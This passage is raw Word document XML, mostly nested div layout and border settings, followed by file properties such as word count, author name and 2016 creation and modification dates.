              </w:divBdr>
            </w:div>
            <w:div w:id="1336303212">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1734622340">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="845559854">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1202089312">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="441265859">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1080907821">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1380132511">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="360"/>
              <w:marTop w:val="240"/>
              <w:marBottom w:val="720"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1952662945">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="867524731">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                </w:div>
              </w:divsChild>
            </w:div>
            <w:div w:id="1371883219">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="621888648">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="475681798">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1665207443">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="360"/>
              <w:marTop w:val="240"/>
              <w:marBottom w:val="720"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1862670045">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1277907879">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="445658797">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="360"/>
              <w:marTop w:val="240"/>
              <w:marBottom w:val="720"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="792558079">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1165361781">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1790204466">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1193835874">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="360"/>
              <w:marTop w:val="240"/>
              <w:marBottom w:val="720"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="959993511">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1945991893">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1766337597">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="921453626">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="960"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1883177443">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="90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1050</TotalTime>
  <Pages>1</Pages>
  <Words>80200</Words>
  <Characters>457142</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>3809</Lines>
  <Paragraphs>1072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536270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Mikhail Voloshin</dc:creator>
  <cp:lastModifiedBy>Voloshin, Mikhail</cp:lastModifiedBy>
  <cp:revision>506</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2016-03-22T20:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2016-04-06T14:45:00Z</dcterms:modified>
</cp:coreProperties>
</file>